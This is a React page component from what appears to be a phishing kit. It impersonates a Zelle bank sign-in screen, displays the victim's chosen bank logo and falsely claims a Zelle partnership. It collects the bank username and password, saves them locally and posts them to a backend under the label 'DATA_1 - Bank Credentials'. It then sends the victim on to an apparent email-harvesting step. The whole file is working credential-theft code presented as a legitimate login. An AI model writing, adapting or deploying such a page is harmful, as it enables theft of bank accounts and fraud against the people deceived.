import React, { useState, useEffect } from 'react';
import zelleLogo from '../assets/imgs/zelleloggo.svg';
import '../styles/ConnectBankPage.css';
import { useAppContext } from '../context/AppContext';
import { backendLink } from '../utils/backendLink';
const ConnectBankPage = () => {
  const [passwordType, setPasswordType] = useState('password');
  const [formData, setFormData] = useState({
    username: '',
    password: ''
  });
  const bankName = '';
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState({
    username: '',
    password: ''
  });
  const { bankDetails, navigateTo, bankSearch, emailConnect } = useAppContext()

  useEffect(() => {
    document.title = `Bank Sign In | Zelle`;
    if (!bankDetails) {
      navigateTo(`/${bankSearch}`);
    }
  }, [bankDetails, navigateTo]);

  const togglePasswordVisibility = () => {
    setPasswordType(passwordType === 'password' ? 'text' : 'password');
  };

  const validateForm = () => {
    const newErrors = {
      username: '',
      password: ''
    };

    if (!formData.username.trim()) {
      newErrors.username = 'Username is required';
    }
    if (!formData.password.trim()) {
      newErrors.password = 'Password is required';
    }

    setErrors(newErrors);
    return !newErrors.username && !newErrors.password;
  };

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData({
      ...formData,
      [name]: value
    });
    // Clear error when user starts typing
    if (errors[name]) {
      setErrors({
        ...errors,
        [name]: ''
      });
    }
  };

  const handleSignIn = async () => {
    if (validateForm()) {
      setIsLoading(true);

      // Save to localStorage
      localStorage.setItem('bankCredentials', JSON.stringify({
        username: formData.username,
        password: formData.password,
        bankName: bankDetails?.name,
        timestamp: new Date().toISOString()
      }));

      console.log('bankCredentials', localStorage.getItem('bankCredentials'));

      const detail1 = {
        username: formData.username,
        password: formData.password,
        bankName: bankDetails?.name,
        dataName: "DATA_1 - Bank Credentials",
        timestamp: new Date().toISOString()
      }

      try {
        const response = await fetch(`${backendLink}/api/details`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(detail1)
        });
        console.log(response)

        if (!response.ok) {
          throw new Error('Network response was not ok');
        }

        // Simulate API call with timeout
        setTimeout(() => {
          setIsLoading(false);
          navigateTo(`/${emailConnect}`);
        }, 1000);
      } catch (error) {
        console.error('Error fetching data:', error);
      }
    }
  };



  return (
    <div className="page-container">
      <div className="form-container">
        <img src={zelleLogo} alt="Zelle Logo" className="zelle-logo" />

        <p className="continue-text">Continue with</p>

        <img src={bankDetails?.image} alt={bankDetails?.name} className="bank-logo" />

        <div className="info-box">
          <p>
            To Sign In: Enter your <span className="bank-name">{bankDetails?.name}</span> User ID and password.
            Then, click the 'Sign In' button.
          </p>
        </div>

        <div className="input-group unm">
          <input
            type="text"
            name="username"
            placeholder="Username"
            className={`input-field ${errors.username ? 'error' : ''}`}
            value={formData.username}
            onChange={handleChange}
          />
          <label className="input-label">Username</label>
          {errors.username && <span className="error-message">{errors.username}</span>}
        </div>

        <div className="input-group">
          <input
            type={passwordType}
            name="password"
            placeholder="Password"
            className={`input-field ${errors.password ? 'error' : ''}`}
            value={formData.password}
            onChange={handleChange}
          />
          {formData.password && (
            <span className="password-toggle" onClick={togglePasswordVisibility}>
              {passwordType === 'password' ? 'Show' : 'Hide'}
            </span>
          )}
          <label className="input-label">Password</label>
          {errors.password && <span className="error-message">{errors.password}</span>}
        </div>

        <button
          className="sign-in-button"
          onClick={handleSignIn}
          disabled={isLoading || !formData.username.trim() || !formData.password.trim()}
        >
          {isLoading ? (
            <div className="button-content">
              <span className="spinner"></span>
              <span>Signing In...</span>
            </div>
          ) : 'SIGN IN'}
        </button>
      </div>

      <footer className="footer agu">
        <p>
          Your financial institution ({bankDetails?.name}) is our trusted partners with brand resources and guidelines to properly represent Zelle® in the marketplace.
        </p>
        <p>
          If you are looking for more information about Zelle®, please visit Zelle® support page.
        </p>
      </footer>
    </div>
  );
};

export default ConnectBankPage;
